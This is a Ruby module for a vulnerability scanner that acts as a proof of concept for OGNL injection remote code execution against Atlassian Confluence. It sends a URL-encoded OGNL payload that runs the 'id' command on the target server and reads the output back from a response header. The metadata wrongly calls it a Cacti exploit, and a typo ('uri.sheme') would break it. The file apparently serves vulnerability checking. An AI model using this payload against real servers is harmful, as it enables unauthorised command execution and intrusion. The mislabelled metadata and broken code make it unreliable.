class RBModule_confluence_ognl_inject
    def initialize
    end
    def metadata
        info = { "name" => "confluence_ognl_inject", 
            "description" => "Poc for cacti front RCE" }
        return info
    end

    def scan(uri)
        scheme = uri.sheme
        if scheme == nil 
            error("Scheme is none #{uri}")
            return 
        end

        url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        info("Send url:#{url}")
        client = Request.new
        resp = client.get(url, headers={"host"=>uri.host})
        headers = resp.headers
        poc_header = headers["X-Cmd-Response"]
        if poc_header.include?("uid")
            issue = {
                "name"=> "cati_front_rce",
                "level" => "highrisk",
                "confidence" => "confirm",
                "detail" => "this is a detail",
                "host" => "#{uri.host}:#{uri.port}",
                "response" => resp.orig_resp
            }

            IssueReporter.add_issue(issue)
        end
    end

    def passive_run(index)
        log = HistoryLog.get_req index
        url = log.url
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(uri)
        #scan("http://127.0.0.1:8009")
    end
    def active_run(url, opts)
    end
end